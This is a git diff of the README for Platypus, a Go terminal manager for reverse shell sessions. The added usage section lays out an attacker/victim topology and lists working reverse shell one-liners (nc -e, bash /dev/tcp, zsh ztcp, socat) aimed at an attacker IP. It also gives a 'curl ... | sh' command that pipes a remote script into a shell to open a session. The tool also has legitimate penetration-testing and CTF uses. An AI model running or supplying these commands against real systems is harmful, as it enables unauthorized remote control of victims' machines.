@@ -1,11 +1,11 @@
 # Platypus
 
 [![Travis-CI](https://travis-ci.org/WangYihang/Platypus.svg)](https://travis-ci.org/WangYihang/Platypus)
-
 [![GitHub stars](https://img.shields.io/github/stars/WangYihang/Platypus.svg)](https://github.com/WangYihang/Platypus/stargazers)
 [![GitHub license](https://img.shields.io/github/license/WangYihang/Platypus.svg)](https://github.com/WangYihang/Platypus)
 
 A modern multiple reverse shell sessions/clients manager via terminal written in go
+
 
 ## Features
 
@@ -13,26 +13,115 @@ A modern multiple reverse shell sessions/clients manager via terminal written in
 - [x] Multiple client connections
 - [x] RESTful API
 - [x] Reverse shell as a service (Pop a reverse shell without remembering idle commands)
-- [x] Download/Upload file
+- [x] Download/Upload file with progress bar
 - [x] Full interactive shell
   - [x] Using vim gracefully in reverse shell
   - [x] Using CTRL+C and CTRL+Z in reverse shell
 
-## Materials
 
-#### User Guide
-* [Attackers' guide](./USAGE.md)
+## Get Start
 
-#### Introduction Slide
-* [[2019-08-24] KCon - Introduction of Platypus ](https://github.com/WangYihang/Presentations/blob/master/2019-08-24%20Introduction%20of%20Platypus%20(KCon)/Introduction%20of%20Platypus.pdf)
+> There are multiple ways to run this tool, feel free to choose one of the following method.
 
-#### Demo Video
-[![](http://img.youtube.com/vi/Yfy6w8qXcQs/0.jpg)](http://www.youtube.com/watch?v=Yfy6w8qXcQs "Platypus")
+###  Run Platypus from source code
+```
+git clone https://github.com/WangYihang/Platypus
+cd Platypus
+go run platypus.go
+```
+![](figure/install.gif)
+###  Run Platypus from release binaries
+1. Download `Platypus` prebuild binary from [HERE](https://github.com/WangYihang/Platypus/releases)
+2. Run the downloaded executable file
 
-#### Screenshots
+###  Run Platypus from docker
+```
+// Build your docker image
+docker build -t platypus .
 
-![](https://upload-images.jianshu.io/upload_images/2355077-9ef699f1de815f9e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
-![](https://upload-images.jianshu.io/upload_images/2355077-bd729ecfe7d2dcc0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
+// Start platypus from docker container, don't forget to create port mapping
+docker run -it -p 9999:9999 platypus
+```
+
+## Usage
+
+### Network Topology
+* Attack IP: `192.168.174.132`
+  * Reverse Shell Service: `0.0.0.0:8080`
+  * RESTful Service: `127.0.0.1:9090`
+* Victim IP: `192.168.174.128`
+
+### Connecting victim and attacker
+
+> As we all know, the using senanrio of reverse shell is about both attacker side and the victim side.
+Now we will seperate the usage guide into two views, the attacker's view and the victim's view.
+
+#### Attacker's view
+
+1. First the attacker should start platypus and listen on some port (eg: 8080).
+
+![](./figure/run.gif)
+
+2. Then the victim is attacked by the attacker and a reverse shell command will be executed on the machine of victim.
+
+#### Victim's view
+The victim machine will be hacked and execute the evil command to generate a reverse shell to attack.
+
+Here are some reverse shell commands for various platform.
+```bash
+nc -e /bin/bash 192.168.174.132 8080
+bash -c 'bash -i >/dev/tcp/192.168.174.132/8080 0>&1'
+zsh -c 'zmodload zsh/net/tcp && ztcp 192.168.174.132 8080 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.174.132:8080
+```
+
+![](./figure/connect.gif)
+
+### Controlling the victim
+
+#### List all victims
+
+![](./figure/list.gif)
+
+#### Select a victim
+![](./figure/jump.gif)
+
+#### Interactive shell
+![](./figure/interact.gif)
+
+#### Download file
+![](./figure/download.gif)
+
+#### Upload file
+![](./figure/upload.gif)
+
+### Other useful feature
+
+#### Reverse shell as a Service
+> [USAGE](./USAGE.md)
+
+> NOTICE: ONLY WORKS on *NIX
+
+The command `bash -c "bash -i >/dev/tcp/8.8.8.8/1337 0>&1"` is the equivalent of `curl http://192.168.174.132:8080/8.8.8.8/1337 | sh`, this feature provides the capability to redirect new reverse shell to another ip and port with out type the boring reverse shell command.
+
+If you just want to pop up a reverse shell to the listening port of platypus, the parameter (`8.8.8.8/1337`) can be omited, like this:
+```bash
+curl http://192.168.174.132:8080/ | sh
+```
+Once the command get executed, the reverse shell session will appear in platypus which is listening on `192.168.174.132:8080`.
+
+#### RESTful API
+> [USAGE](./USAGE.md)
+
+> Demonstration is to be done.
+
+#### Using `VIM` in Reverse Shell (Only on `Linux`)
+> Demonstration is to be done.
+
+## Other Materials
+
+* [Presentation on KCon 2019 ](https://github.com/WangYihang/Presentations/blob/master/2019-08-24%20Introduction%20of%20Platypus%20(KCon)/Introduction%20of%20Platypus.pdf)
+* [Demo Video](http://www.youtube.com/watch?v=Yfy6w8qXcQs "Platypus")
 
 ## TODOs
 - [ ] [#7 Allow user to choose operation for the same IP income connection](https://github.com/WangYihang/Platypus/issues/7)
@@ -55,6 +144,8 @@ A modern multiple reverse shell sessions/clients manager via terminal written in
 - [ ] List file
 - [ ] Web UI
 - [ ] Benchmark
+- [x] Execute user input when input is not a built-in command
+- [x] Download/Upload progress bar
 - [x] [#6 Send one command to all clients at once (Meta Command)](https://github.com/WangYihang/Platypus/issues/6)
 - [x] User guide
 - [x] Upload file
@@ -73,7 +164,6 @@ A modern multiple reverse shell sessions/clients manager via terminal written in
 
 This project exists thanks to all the people who contribute. 
 <a href="https://github.com/WangYihang/Platypus/graphs/contributors"><img src="https://opencollective.com/Platypus/contributors.svg?width=890&button=false" /></a>
-
 
 ## Backers
 
